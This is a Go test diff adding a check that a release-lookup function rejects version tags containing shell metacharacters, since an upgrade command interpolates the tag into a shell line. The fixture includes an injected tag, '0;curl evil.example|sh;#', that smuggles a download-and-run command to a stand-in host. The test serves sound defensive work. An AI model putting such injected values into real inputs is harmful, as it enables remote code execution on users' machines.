@@ -95,3 +95,22 @@ func TestLatestNoReleases(t *testing.T) {
 		t.Error("Latest should return an error when no bare-semver release exists")
 	}
 }
+
+// `cyfr upgrade` interpolates the tag into a shell command line, so a tag
+// that is not plain MAJOR.MINOR.PATCH must never be selected.
+func TestLatestRejectsShellMetacharacters(t *testing.T) {
+	withAPIURL(t, `[
+		{"tag_name": "0;curl evil.example|sh;#"},
+		{"tag_name": "0.5.4-rc1"},
+		{"tag_name": "0.5.4 "},
+		{"tag_name": "0.5.4"}
+	]`, http.StatusOK)
+
+	got, err := Latest(context.Background())
+	if err != nil {
+		t.Fatalf("Latest returned error: %v", err)
+	}
+	if got != "0.5.4" {
+		t.Errorf("Latest = %q, want %q", got, "0.5.4")
+	}
+}
